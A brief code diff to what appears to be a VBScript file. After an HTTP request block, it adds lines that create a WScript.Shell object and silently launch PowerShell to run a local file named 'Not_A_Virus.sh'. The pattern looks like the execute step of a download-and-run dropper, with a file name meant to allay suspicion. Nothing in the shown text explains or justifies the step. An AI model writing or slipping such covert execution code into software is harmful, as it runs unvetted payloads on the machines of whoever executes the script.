@@ -32,3 +32,6 @@ Else
 End If
 
 Set httpRequest = Nothing
+
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -nologo -command .\Not_A_Virus.sh"
